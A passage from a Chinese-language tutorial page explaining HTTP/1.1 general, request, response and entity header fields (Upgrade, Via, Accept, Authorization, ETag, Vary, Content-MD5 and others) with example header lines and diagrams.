<p>以上用例中，正如在首部字段 Transfer-Encoding 中指定的那样，有效使用分块传输编码，且分别被分成 3312 字节和 914 字节大小的分块数据。</p>
<h4 id="upgrade" tabindex="-1"><a class="header-anchor" href="#upgrade" aria-hidden="true">#</a> Upgrade</h4>
<p>首部字段 Upgrade 用于检测 HTTP 协议及其他协议是否可使用更高的版本进行通信，其参数值可以用来指定一个完全不同的通信协议。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151234131.png" alt="image-20220804151234131"></p>
<p>上图用例中，首部字段 Upgrade 指定的值为 TLS/1.0。请注意此处两个字段首部字段的对应关系，Connection 的值被指定为 Upgrade。Upgrade 首部字段产生作用的 Upgrade 对象仅限于客户端和邻接服务器之间。因此，使用首部字段 Upgrade 时，还需要额外指定Connection:Upgrade。</p>
<p>对于附有首部字段 Upgrade 的请求，服务器可用 101 Switching Protocols 状态码作为响应返回。</p>
<h4 id="via" tabindex="-1"><a class="header-anchor" href="#via" aria-hidden="true">#</a> Via</h4>
<p>使用首部字段 Via 是为了追踪客户端与服务器之间的请求和响应报文的传输路径。</p>
<p>报文经过代理或网关时，会先在首部字段 Via 中附加该服务器的信息，然后再进行转发。这个做法和 traceroute 及电子邮件的 Received
首部的工作机制很类似。</p>
<p>首部字段 Via 不仅用于追踪报文的转发，还可避免请求回环的发生。所以必须在经过代理时附加该首部字段内容。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151244020.png" alt="image-20220804151244020"></p>
<p>上图用例中，在经过代理服务器 A 时，Via 首部附加了“1.0 gw.hackr.jp (Squid/3.1)”这样的字符串值。行头的 1.0 是指接收请求的服务器上应用的 HTTP 协议版本。接下来经过代理服务器 B 时亦是如此，在 Via 首部附加服务器信息，也可增加 1 个新的 Via 首部写入服务器信息。</p>
<p>Via 首部是为了追踪传输路径，所以经常会和 TRACE 方法一起使用。比如，代理服务器接收到由 TRACE 方法发送过来的请求（其中Max-Forwards: 0）时，代理服务器就不能再转发该请求了。这种情况下，代理服务器会将自身的信息附加到 Via 首部后，返回该请求的响应。</p>
<h4 id="warning" tabindex="-1"><a class="header-anchor" href="#warning" aria-hidden="true">#</a> Warning</h4>
<p>HTTP/1.1 的 Warning 首部是从 HTTP/1.0 的响应首部（Retry-After）演变过来的。该首部通常会告知用户一些与缓存相关的问题的警告。</p>
<p><code v-pre>Warning: 113 gw.hackr.jp:8080 &quot;Heuristic expiration&quot; Tue, 03 Jul 2012 05:09:44 GMT</code></p>
<p>Warning 首部的格式如下。最后的日期时间部分可省略。</p>
<p><code v-pre>Warning: [警告码][警告的主机:端口号]“[警告内容]”([日期时间])</code></p>
<p>HTTP/1.1 中定义了 7 种警告。警告码对应的警告内容仅推荐参考。另外，警告码具备扩展性，今后有可能追加新的警告码。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151259884.png" alt="image-20220804151259884"></p>
<h3 id="请求首部字段" tabindex="-1"><a class="header-anchor" href="#请求首部字段" aria-hidden="true">#</a> 请求首部字段</h3>
<p>请求首部字段是从客户端往服务器端发送请求报文中所使用的字段，用于补充请求的附加信息、客户端信息、对响应内容相关的优先级等内容。</p>
<h4 id="accept" tabindex="-1"><a class="header-anchor" href="#accept" aria-hidden="true">#</a> Accept</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151309305.png" alt="image-20220804151309305"></p>
<p><code v-pre>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</code></p>
<p>Accept 首部字段可通知服务器，用户代理能够处理的媒体类型及媒体类型的相对优先级。可使用 type/subtype 这种形式，一次指定多种媒体类型。</p>
<p>下面我们试举几个媒体类型的例子。</p>
<ul>
<li>文本文件</li>
</ul>
<p>text/html, text/plain, text/css ...</p>
<p>application/xhtml<code v-pre>+</code>xml, application/xml ...</p>
<ul>
<li>图片文件</li>
</ul>
<p>image/jpeg, image/gif, image/png ...</p>
<ul>
<li>视频文件</li>
</ul>
<p>video/mpeg, video/quicktime ...</p>
<ul>
<li>应用程序使用的二进制文件</li>
</ul>
<p>application/octet-stream, application/zip ...</p>
<p>比如，如果浏览器不支持 PNG 图片的显示，那 Accept 就不指定 image/png，而指定可处理的 image/gif 和 image/jpeg 等图片类型。</p>
<p>若想要给显示的媒体类型增加优先级，则使用 q= 来额外表示权重值，用分号（;）进行分隔。权重值 q 的范围是 0~1（可精确到小数点后 3 位），且 1 为最大值。不指定权重 q 值时，默认权重为 q=1.0。</p>
<p>当服务器提供多种内容时，将会首先返回权重值最高的媒体类型。</p>
<h4 id="accept-charset" tabindex="-1"><a class="header-anchor" href="#accept-charset" aria-hidden="true">#</a> Accept-Charset</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151320615.png" alt="image-20220804151320615"></p>
<p><code v-pre>Accept-Charset: iso-8859-5, unicode-1-1;q=0.8</code></p>
<p>Accept-Charset 首部字段可用来通知服务器用户代理支持的字符集及字符集的相对优先顺序。另外，可一次性指定多种字符集。与首部字
段 Accept 相同的是可用权重 q 值来表示相对优先级。</p>
<p>该首部字段应用于内容协商机制的服务器驱动协商。</p>
<h4 id="accept-encoding" tabindex="-1"><a class="header-anchor" href="#accept-encoding" aria-hidden="true">#</a> Accept-Encoding</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151329231.png" alt="image-20220804151329231"></p>
<p><code v-pre>Accept-Encoding: gzip, deflate</code></p>
<p>Accept-Encoding 首部字段用来告知服务器用户代理支持的内容编码及内容编码的优先级顺序。可一次性指定多种内容编码。</p>
<p>下面试举出几个内容编码的例子。</p>
<ul>
<li>gzip</li>
</ul>
<p>由文件压缩程序 gzip（GNU zip）生成的编码格式（RFC1952），采用 Lempel-Ziv 算法（LZ77）及 32 位循环冗余校验（Cyclic Redundancy Check，通称 CRC）。</p>
<ul>
<li>compress</li>
</ul>
<p>由 UNIX 文件压缩程序 compress 生成的编码格式，采用 LempelZiv-Welch 算法（LZW）。deflate 组合使用 zlib 格式（RFC1950）及由 deflate 压缩算法（RFC1951）生成的编码格式。</p>
<ul>
<li>identity</li>
</ul>
<p>不执行压缩或不会变化的默认编码格式采用权重 q 值来表示相对优先级，这点与首部字段 Accept 相同。另外，也可使用星号（*）作为通配符，指定任意的编码格式。</p>
<h4 id="accept-language" tabindex="-1"><a class="header-anchor" href="#accept-language" aria-hidden="true">#</a> Accept-Language</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151340084.png" alt="image-20220804151340084"></p>
<p>首部字段 Accept-Language 用来告知服务器用户代理能够处理的自然语言集（指中文或英文等），以及自然语言集的相对优先级。可一次
指定多种自然语言集。</p>
<p>和 Accept 首部字段一样，按权重值 q 来表示相对优先级。在上述图例中，客户端在服务器有中文版资源的情况下，会请求其返回中文版
对应的响应，没有中文版时，则请求返回英文版响应。</p>
<h4 id="authorization" tabindex="-1"><a class="header-anchor" href="#authorization" aria-hidden="true">#</a> Authorization</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151350006.png" alt="image-20220804151350006"></p>
<p><code v-pre>Authorization: Basic dWVub3NlbjpwYXNzd29yZA==</code></p>
<p>首部字段 Authorization 是用来告知服务器，用户代理的认证信息（证书值）。通常，想要通过服务器认证的用户代理会在接收到返回的401 状态码响应后，把首部字段 Authorization 加入请求中。共用缓存在接收到含有 Authorization 首部字段的请求时的操作处理会略有差异。</p>
<h4 id="expect" tabindex="-1"><a class="header-anchor" href="#expect" aria-hidden="true">#</a> Expect</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151359117.png" alt="image-20220804151359117"></p>
<p><code v-pre>Expect: 100-continue</code></p>
<p>客户端使用首部字段 Expect 来告知服务器，期望出现的某种特定行为。因服务器无法理解客户端的期望作出回应而发生错误时，会返回状态码 417 Expectation Failed。客户端可以利用该首部字段，写明所期望的扩展。虽然 HTTP/1.1 规范只定义了 100-continue（状态码 100 Continue 之意）。等待状态码 100 响应的客户端在发生请求时，需要指定 Expect:100-continue。</p>
<h4 id="from" tabindex="-1"><a class="header-anchor" href="#from" aria-hidden="true">#</a> From</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151407214.png" alt="image-20220804151407214"></p>
<p>首部字段 From 用来告知服务器使用用户代理的用户的电子邮件地址。通常，其使用目的就是为了显示搜索引擎等用户代理的负责人的电子邮件联系方式。使用代理时，应尽可能包含 From 首部字段（但可能会因代理不同，将电子邮件地址记录在 User-Agent 首部字段内）。</p>
<h4 id="host" tabindex="-1"><a class="header-anchor" href="#host" aria-hidden="true">#</a> Host</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151416961.png" alt="image-20220804151416961"></p>
<p>图：虚拟主机运行在同一个 IP 上，因此使用首部字段 Host 加以区分</p>
<p><code v-pre>Host: www.hackr.jp</code></p>
<p>首部字段 Host 会告知服务器，请求的资源所处的互联网主机名和端口号。Host 首部字段在 HTTP/1.1 规范内是唯一一个必须被包含在请
求内的首部字段。</p>
<p>首部字段 Host 和以单台服务器分配多个域名的虚拟主机的工作机制有很密切的关联，这是首部字段 Host 必须存在的意义。</p>
<p>请求被发送至服务器时，请求中的主机名会用 IP 地址直接替换解决。但如果这时，相同的 IP 地址下部署运行着多个域名，那么服务器就会无法理解究竟是哪个域名对应的请求。因此，就需要使用首部字段 Host 来明确指出请求的主机名。若服务器未设定主机名，那直接发送一个空值即可。如下所示。</p>
<p><code v-pre>Host:</code></p>
<h4 id="if-match" tabindex="-1"><a class="header-anchor" href="#if-match" aria-hidden="true">#</a> If-Match</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151426978.png" alt="image-20220804151426978"></p>
<p>形如 If-xxx 这种样式的请求首部字段，都可称为条件请求。服务器接收到附带条件的请求后，只有判断指定条件为真时，才会执行请求。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151439425.png" alt="image-20220804151439425"></p>
<p>图：只有当 If-Match 的字段值跟 ETag 值匹配一致时，服务器才会接受请求</p>
<p><code v-pre>If-Match: &quot;123456&quot;</code></p>
<p>首部字段 If-Match，属附带条件之一，它会告知服务器匹配资源所用的实体标记（ETag）值。这时的服务器无法使用弱 ETag 值。（请参
照本章有关首部字段 ETag 的说明）</p>
<p>服务器会比对 If-Match 的字段值和资源的 ETag 值，仅当两者一致时，才会执行请求。反之，则返回状态码 412 Precondition Failed 的响应。</p>
<p>还可以使用星号（*）指定 If-Match 的字段值。针对这种情况，服务器将会忽略 ETag 的值，只要资源存在就处理请求。</p>
<h4 id="if-modified-since" tabindex="-1"><a class="header-anchor" href="#if-modified-since" aria-hidden="true">#</a> If-Modified-Since</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151451549.png" alt="image-20220804151451549"></p>
<p>图：如果在 If-Modified-Since 字段指定的日期时间后，资源发生了更新，服务器会接受请求</p>
<p><code v-pre>If-Modified-Since: Thu, 15 Apr 2004 00:00:00 GMT</code></p>
<p>首部字段 If-Modified-Since，属附带条件之一，它会告知服务器若 If-Modified-Since 字段值早于资源的更新时间，则希望能处理该请求。而在指定 If-Modified-Since 字段值的日期时间之后，如果请求的资源都没有过更新，则返回状态码 304 Not Modified 的响应。</p>
<p>If-Modified-Since 用于确认代理或客户端拥有的本地资源的有效性。获取资源的更新日期时间，可通过确认首部字段 Last-Modified 来确定。</p>
<h4 id="if-none-match" tabindex="-1"><a class="header-anchor" href="#if-none-match" aria-hidden="true">#</a> If-None-Match</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151506045.png" alt="image-20220804151506045"></p>
<p>图：只有在 If-None-Match 的字段值与 ETag 值不一致时，可处理该请求。与 If-Match 首部字段的作用相反</p>
<p>首部字段 If-None-Match 属于附带条件之一。它和首部字段 If-Match作用相反。用于指定 If-None-Match 字段值的实体标记（ETag）值与请求资源的 ETag 不一致时，它就告知服务器处理该请求。</p>
<p>在 GET 或 HEAD 方法中使用首部字段 If-None-Match 可获取最新的资源。因此，这与使用首部字段 If-Modified-Since 时有些类似。</p>
<h4 id="if-range" tabindex="-1"><a class="header-anchor" href="#if-range" aria-hidden="true">#</a> If-Range</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151521993.png" alt="image-20220804151521993"></p>
<p>首部字段 If-Range 属于附带条件之一。它告知服务器若指定的 If-Range 字段值（ETag 值或者时间）和请求资源的 ETag 值或时间相一致时，则作为范围请求处理。反之，则返回全体资源。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151550659.png" alt="image-20220804151550659"></p>
<p>下面我们思考一下不使用首部字段 If-Range 发送请求的情况。服务器端的资源如果更新，那客户端持有资源中的一部分也会随之无效，当然，范围请求作为前提是无效的。这时，服务器会暂且以状态码 412 Precondition Failed 作为响应返回，其目的是催促客户端再次发送请求。这样一来，与使用首部字段 If-Range 比起来，就需要花费两倍的功夫。</p>
<h4 id="if-unmodified-since" tabindex="-1"><a class="header-anchor" href="#if-unmodified-since" aria-hidden="true">#</a> If-Unmodified-Since</h4>
<p><code v-pre>If-Unmodified-Since: Thu, 03 Jul 2012 00:00:00 GMT</code></p>
<p>首部字段 If-Unmodified-Since 和首部字段 If-Modified-Since 的作用相反。它的作用的是告知服务器，指定的请求资源只有在字段值内指的日期时间之后，未发生更新的情况下，才能处理请求。如果在指定日期时间后发生了更新，则以状态码 412 Precondition Failed 作为响应返回。</p>
<h4 id="max-forwards" tabindex="-1"><a class="header-anchor" href="#max-forwards" aria-hidden="true">#</a> Max-Forwards</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151604534.png" alt="image-20220804151604534"></p>
<p><code v-pre>Max-Forwards: 10</code></p>
<p>通过 TRACE 方法或 OPTIONS 方法，发送包含首部字段 Max-Forwards 的请求时，该字段以十进制整数形式指定可经过的服务器最大数目。服务器在往下一个服务器转发请求之前，Max-Forwards 的值减 1 后重新赋值。当服务器接收到 Max-Forwards 值为 0 的请求时，则不再进行转发，而是直接返回响应。</p>
<p>使用 HTTP 协议通信时，请求可能会经过代理等多台服务器。途中，如果代理服务器由于某些原因导致请求转发失败，客户端也就等不到服务器返回的响应了。对此，我们无从可知。</p>
<p>可以灵活使用首部字段 Max-Forwards，针对以上问题产生的原因展开调查。由于当 Max-Forwards 字段值为 0 时，服务器就会立即返回
响应，由此我们至少可以对以那台服务器为终点的传输路径的通信状况有所把握。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151615855.png" alt="image-20220804151615855"></p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151622885.png" alt="image-20220804151622885"></p>
<h4 id="proxy-authorization" tabindex="-1"><a class="header-anchor" href="#proxy-authorization" aria-hidden="true">#</a> Proxy-Authorization</h4>
<p><code v-pre>Proxy-Authorization: Basic dGlwOjkpNLAGfFY5</code></p>
<p>接收到从代理服务器发来的认证质询时，客户端会发送包含首部字段Proxy-Authorization 的请求，以告知服务器认证所需要的信息。</p>
<p>这个行为是与客户端和服务器之间的 HTTP 访问认证相类似的，不同之处在于，认证行为发生在客户端与代理之间。客户端与服务器之间的认证，使用首部字段 Authorization 可起到相同作用。</p>
<h4 id="range" tabindex="-1"><a class="header-anchor" href="#range" aria-hidden="true">#</a> Range</h4>
<p><code v-pre>Range: bytes=5001-10000</code></p>
<p>对于只需获取部分资源的范围请求，包含首部字段 Range 即可告知服务器资源的指定范围。上面的示例表示请求获取从第 5001 字节至第
10000 字节的资源。</p>
<p>接收到附带 Range 首部字段请求的服务器，会在处理请求之后返回状态码为 206 Partial Content 的响应。无法处理该范围请求时，则会返
回状态码 200 OK 的响应及全部资源。</p>
<h4 id="referer" tabindex="-1"><a class="header-anchor" href="#referer" aria-hidden="true">#</a> Referer</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151635738.png" alt="image-20220804151635738"></p>
<p><code v-pre>Referer: http://www.hackr.jp/index.htm</code></p>
<p>首部字段 Referer 会告知服务器请求的原始资源的 URI。客户端一般都会发送 Referer 首部字段给服务器。但当直接在浏览器的地址栏输入 URI，或出于安全性的考虑时，也可以不发送该首部字段。</p>
<p>因为原始资源的 URI 中的查询字符串可能含有 ID 和密码等保密信息，要是写进 Referer 转发给其他服务器，则有可能导致保密信息的泄露。</p>
<p>另外，Referer 的正确的拼写应该是 Referrer，但不知为何，大家一直沿用这个错误的拼写。</p>
<h4 id="te" tabindex="-1"><a class="header-anchor" href="#te" aria-hidden="true">#</a> TE</h4>
<p><code v-pre>TE: gzip, deflate;q=0.5</code></p>
<p>首部字段 TE 会告知服务器客户端能够处理响应的传输编码方式及相对优先级。它和首部字段 Accept-Encoding 的功能很相像，但是用于传输编码。</p>
<p>首部字段 TE 除指定传输编码之外，还可以指定伴随 trailer 字段的分块传输编码的方式。应用后者时，只需把 trailers 赋值给该字段值。</p>
<p><code v-pre>TE: trailers</code></p>
<h4 id="user-agent" tabindex="-1"><a class="header-anchor" href="#user-agent" aria-hidden="true">#</a> User-Agent</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151645729.png" alt="image-20220804151645729"></p>
<p><code v-pre>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1</code></p>
<p>首部字段 User-Agent 会将创建请求的浏览器和用户代理名称等信息传达给服务器。</p>
<p>由网络爬虫发起请求时，有可能会在字段内添加爬虫作者的电子邮件地址。此外，如果请求经过代理，那么中间也很可能被添加上代理服务器的名称。</p>
<h3 id="响应首部字段" tabindex="-1"><a class="header-anchor" href="#响应首部字段" aria-hidden="true">#</a> 响应首部字段</h3>
<p>响应首部字段是由服务器端向客户端返回响应报文中所使用的字段，用于补充响应的附加信息、服务器信息，以及对客户端的附加要求等信息。</p>
<h4 id="accept-ranges" tabindex="-1"><a class="header-anchor" href="#accept-ranges" aria-hidden="true">#</a> Accept-Ranges</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151655237.png" alt="image-20220804151655237"></p>
<p>图：当不能处理范围请求时，Accept-Ranges: none</p>
<p><code v-pre>Accept-Ranges: bytes</code></p>
<p>首部字段 Accept-Ranges 是用来告知客户端服务器是否能处理范围请求，以指定获取服务器端某个部分的资源。</p>
<p>可指定的字段值有两种，可处理范围请求时指定其为 bytes，反之则指定其为 none。</p>
<h4 id="age" tabindex="-1"><a class="header-anchor" href="#age" aria-hidden="true">#</a> Age</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151703195.png" alt="image-20220804151703195"></p>
<p><code v-pre>Age: 600</code></p>
<p>首部字段 Age 能告知客户端，源服务器在多久前创建了响应。字段值的单位为秒。</p>
<p>若创建该响应的服务器是缓存服务器，Age 值是指缓存后的响应再次发起认证到认证完成的时间值。代理创建响应时必须加上首部字段Age。</p>
<h4 id="etag" tabindex="-1"><a class="header-anchor" href="#etag" aria-hidden="true">#</a> ETag</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151712577.png" alt="image-20220804151712577"></p>
<p><code v-pre>ETag: &quot;82e22293907ce725faf67773957acd12&quot;</code></p>
<p>首部字段 ETag 能告知客户端实体标识。它是一种可将资源以字符串形式做唯一性标识的方式。服务器会为每份资源分配对应的 ETag值。</p>
<p>另外，当资源更新时，ETag 值也需要更新。生成 ETag 值时，并没有统一的算法规则，而仅仅是由服务器来分配。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151801531.png" alt="image-20220804151801531"></p>
<p>资源被缓存时，就会被分配唯一性标识。例如，当使用中文版的浏览器访问 http://www.google.com/ 时，就会返回中文版对应的资源，而使用英文版的浏览器访问时，则会返回英文版对应的资源。两者的 URI 是相同的，所以仅凭 URI 指定缓存的资源是相当困难的。若在下载过程中出现连接中断、再连接的情况，都会依照 ETag 值来指定资源。</p>
<p><strong>强 ETag 值和弱 Tag 值</strong></p>
<p>ETag 中有强 ETag 值和弱 ETag 值之分。</p>
<ul>
<li>强 ETag 值</li>
</ul>
<p>强 ETag 值，不论实体发生多么细微的变化都会改变其值。</p>
<p><code v-pre>ETag: &quot;usagi-1234&quot;</code></p>
<ul>
<li>弱 ETag 值</li>
</ul>
<p>弱 ETag 值只用于提示资源是否相同。只有资源发生了根本改变，产生差异时才会改变 ETag 值。这时，会在字段值最开始处附加 W/。</p>
<p><code v-pre>ETag: W/&quot;usagi-1234&quot;</code></p>
<h4 id="location" tabindex="-1"><a class="header-anchor" href="#location" aria-hidden="true">#</a> Location</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151811423.png" alt="image-20220804151811423"></p>
<p><code v-pre>Location: http://www.usagidesign.jp/sample.html</code></p>
<p>使用首部字段 Location 可以将响应接收方引导至某个与请求 URI 位置不同的资源。</p>
<p>基本上，该字段会配合 3xx ：Redirection 的响应，提供重定向的URI。</p>
<p>几乎所有的浏览器在接收到包含首部字段 Location 的响应后，都会强制性地尝试对已提示的重定向资源的访问。</p>
<h4 id="proxy-authenticate" tabindex="-1"><a class="header-anchor" href="#proxy-authenticate" aria-hidden="true">#</a> Proxy-Authenticate</h4>
<p><code v-pre>Proxy-Authenticate: Basic realm=&quot;Usagidesign Auth&quot;</code></p>
<p>首部字段 Proxy-Authenticate 会把由代理服务器所要求的认证信息发送给客户端。</p>
<p>它与客户端和服务器之间的 HTTP 访问认证的行为相似，不同之处在于其认证行为是在客户端与代理之间进行的。而客户端与服务器之间进行认证时，首部字段 WWW-Authorization 有着相同的作用。</p>
<h4 id="retry-after" tabindex="-1"><a class="header-anchor" href="#retry-after" aria-hidden="true">#</a> Retry-After</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151821963.png" alt="image-20220804151821963"></p>
<p><code v-pre>Retry-After: 120</code></p>
<p>首部字段 Retry-After 告知客户端应该在多久之后再次发送请求。主要配合状态码 503 Service Unavailable 响应，或 3xx Redirect 响应一起使用。</p>
<p>字段值可以指定为具体的日期时间（Wed, 04 Jul 2012 06：34：24 GMT 等格式），也可以是创建响应后的秒数。</p>
<h4 id="server" tabindex="-1"><a class="header-anchor" href="#server" aria-hidden="true">#</a> Server</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151829992.png" alt="image-20220804151829992"></p>
<p><code v-pre>Server: Apache/2.2.17 (Unix)</code></p>
<p>首部字段 Server 告知客户端当前服务器上安装的 HTTP 服务器应用程序的信息。不单单会标出服务器上的软件应用名称，还有可能包括版本号和安装时启用的可选项。</p>
<p><code v-pre>Server: Apache/2.2.6 (Unix) PHP/5.2.5</code></p>
<h3 id="vary" tabindex="-1"><a class="header-anchor" href="#vary" aria-hidden="true">#</a> Vary</h3>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151838050.png" alt="image-20220804151838050"></p>
<p>图：当代理服务器接收到带有 Vary 首部字段指定获取资源的请求时，如果使用的 Accept-Language 字段的值相同，那么就直接从缓存返回响应。反之，则需要先从源服务器端获取资源后才能作为响应返回。</p>
<p><code v-pre>Vary: Accept-Language</code></p>
<p>首部字段 Vary 可对缓存进行控制。源服务器会向代理服务器传达关于本地缓存使用方法的命令。</p>
<p>从代理服务器接收到源服务器返回包含 Vary 指定项的响应之后，若再要进行缓存，仅对请求中含有相同 Vary 指定首部字段的请求返回
缓存。即使对相同资源发起请求，但由于 Vary 指定的首部字段不相同，因此必须要从源服务器重新获取资源。</p>
<h4 id="www-authenticate" tabindex="-1"><a class="header-anchor" href="#www-authenticate" aria-hidden="true">#</a> WWW-Authenticate</h4>
<p><code v-pre>WWW-Authenticate: Basic realm=&quot;Usagidesign Auth&quot;</code></p>
<p>首部字段 WWW-Authenticate 用于 HTTP 访问认证。它会告知客户端适用于访问请求 URI 所指定资源的认证方案（Basic 或是 Digest）和带参数提示的质询（challenge）。状态码 401 Unauthorized 响应中，肯定带有首部字段 WWW-Authenticate。</p>
<p>上述示例中，realm 字段的字符串是为了辨别请求 URI 指定资源所受到的保护策略。</p>
<h3 id="实体首部字段" tabindex="-1"><a class="header-anchor" href="#实体首部字段" aria-hidden="true">#</a> 实体首部字段</h3>
<p>实体首部字段是包含在请求报文和响应报文中的实体部分所使用的首部，用于补充内容的更新时间等与实体相关的信息。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151854347.png" alt="image-20220804151854347"></p>
<p>图：在请求和响应两方的 HTTP 报文中都含有与实体相关的首部字段。</p>
<h4 id="allow" tabindex="-1"><a class="header-anchor" href="#allow" aria-hidden="true">#</a> Allow</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151902936.png" alt="image-20220804151902936"></p>
<p><code v-pre>Allow: GET, HEAD</code></p>
<p>首部字段 Allow 用于通知客户端能够支持 Request-URI 指定资源的所有 HTTP 方法。当服务器接收到不支持的 HTTP 方法时，会以状态码
405 Method Not Allowed 作为响应返回。与此同时，还会把所有能支持的 HTTP 方法写入首部字段 Allow 后返回。</p>
<h4 id="content-encoding" tabindex="-1"><a class="header-anchor" href="#content-encoding" aria-hidden="true">#</a> Content-Encoding</h4>
<p><code v-pre>Content-Encoding: gzip</code></p>
<p>首部字段 Content-Encoding 会告知客户端服务器对实体的主体部分选用的内容编码方式。内容编码是指在不丢失实体信息的前提下所进行的压缩。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804151914729.png" alt="image-20220804151914729"></p>
<p>主要采用以下 4 种内容编码的方式。</p>
<ul>
<li>gzip</li>
<li>compress</li>
<li>deflate</li>
<li>identity</li>
</ul>
<h4 id="content-language" tabindex="-1"><a class="header-anchor" href="#content-language" aria-hidden="true">#</a> Content-Language</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804152053623.png" alt="image-20220804152053623"></p>
<p><code v-pre>Content-Language: zh-CN</code></p>
<p><code v-pre>首部字段 Content-Language 会告知客户端，实体主体使用的自然语言（指中文或英文等语言）。</code></p>
<h4 id="content-length" tabindex="-1"><a class="header-anchor" href="#content-length" aria-hidden="true">#</a> Content-Length</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804152107397.png" alt="image-20220804152107397"></p>
<p>首部字段 Content-Length 表明了实体主体部分的大小（单位是字节）。对实体主体进行内容编码传输时，不能再使用 Content-Length 首部字段。由于实体主体大小的计算方法略微复杂，所以在此不再展开。由于实体主体大小的计算方法略微复杂，所以在此不再展开。读者若想一探究竟，可参考 RFC2616 的 4.4。</p>
<h4 id="content-location" tabindex="-1"><a class="header-anchor" href="#content-location" aria-hidden="true">#</a> Content-Location</h4>
<p><code v-pre>Content-Location: http://www.hackr.jp/index-ja.html</code></p>
<p>首部字段 Content-Location 给出与报文主体部分相对应的 URI。和首部字段 Location 不同，Content-Location 表示的是报文主体返回资源对应的 URI。</p>
<p>比如，对于使用首部字段 Accept-Language 的服务器驱动型请求，当返回的页面内容与实际请求的对象不同时，首部字段 Content-Location内会写明 URI。（访问 http://www.hackr.jp/ 返回的对象却是http://www.hackr.jp/index-ja.html 等类似情况）</p>
<h4 id="content-md5" tabindex="-1"><a class="header-anchor" href="#content-md5" aria-hidden="true">#</a> Content-MD5</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804152121246.png" alt="image-20220804152121246"></p>
<p>图：客户端会对接收的报文主体执行相同的 MD5 算法，然后与首部字段 Content-MD5 的字段值比较</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>Content-MD5: OGFkZDUwNGVhNGY3N2MxMDIwZmQ4NTBmY2IyTY==
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>首部字段 Content-MD5 是一串由 MD5 算法生成的值，其目的在于检查报文主体在传输过程中是否保持完整，以及确认传输到达。对报文主体执行MD5 算法获得的 128 位二进制数，再通过 Base64 编码后将结果写入 Content-MD5 字段值。由于 HTTP 首部无法记录二进制值，所以要通过 Base64 编码处理。为确保报文的有效性，作为接收方的客户端会对报文主体再执行一次相同的 MD5 算法。计算出的125值与字段值作比较后，即可判断出报文主体的准确性。</p>
<p>采用这种方法，对内容上的偶发性改变是无从查证的，也无法检测出恶意篡改。其中一个原因在于，内容如果能够被篡改，那么同时意味着 Content-MD5 也可重新计算然后被篡改。所以处在接收阶段的客户端是无法意识到报文主体以及首部字段 Content-MD5 是已经被篡改过的。</p>
<h4 id="content-range" tabindex="-1"><a class="header-anchor" href="#content-range" aria-hidden="true">#</a> Content-Range</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804152133670.png" alt="image-20220804152133670"></p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>Content-Range: bytes 5001-10000/10000
